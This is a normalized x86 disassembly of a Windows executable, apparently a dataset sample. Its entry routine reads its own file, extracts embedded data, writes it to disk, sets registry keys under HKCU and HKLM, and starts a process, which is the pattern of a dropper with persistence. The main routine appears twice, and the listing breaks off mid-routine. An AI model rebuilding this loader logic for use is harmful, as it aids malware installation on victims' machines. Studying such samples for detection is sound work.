mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_4023f8
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call _crt_debugger_hook
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call _crt_debugger_hook
pop ecx
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call sub_40727d
nop
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_407f70
add esp 0x4
call sub_408130
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_408160
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_408160
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_407f70
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_407f70
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_407f70
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_407f70
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_407f70
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_407f70
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
push 0xeb18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_4080a0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0xeb18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_40727d
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_407f70
add esp 0x4
call sub_408130
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_408160
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_408160
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
